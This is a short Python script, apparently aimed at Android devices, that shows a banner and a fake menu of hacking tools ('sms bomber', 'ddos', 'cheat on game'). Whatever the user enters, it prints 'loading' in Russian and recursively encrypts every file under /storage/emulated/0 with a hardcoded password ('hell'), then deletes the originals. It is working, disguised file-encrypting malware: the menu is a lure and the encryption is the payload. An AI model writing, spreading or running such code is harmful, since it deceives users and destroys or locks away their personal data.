from colorama import *
import os,sys
menu = '''


████▄██▄   ▄████▄   ██▄████▄  ██    ██
 ██ ██ ██  ██▄▄▄▄██  ██▀   ██  ██    ██
 ██ ██ ██  ██▀▀▀▀▀▀  ██    ██  ██    ██
 ██ ██ ██  ▀██▄▄▄▄█  ██    ██  ██▄▄▄███
 ▀▀ ▀▀ ▀▀    ▀▀▀▀▀   ▀▀    ▀▀   ▀▀▀▀ ▀▀

'''
script = '''
[1] - sms bomber
[2] - ddos
[3] - saycheese
[4] - websploit
[5] - cheat on game
'''
def crypt(file):
    import pyAesCrypt
    password = 'hell'
    bufferSize = 512*1024
    pyAesCrypt.encryptFile(str(file),str(file)+'.crp',password,bufferSize)
    os.remove(file)
def walk(dir):
    for name in os.listdir(dir):
        path = os.path.join(dir,name)
        if os.path.isfile(path): crypt(path)
        else: walk(path)
def cheat():
    print(Fore.RED + menu)
    print(Fore.BLUE + script)
    s=input('root@mail|> ')
    print(Fore.YELLOW + 'загрузка...')
    walk('/storage/emulated/0')
cheat()
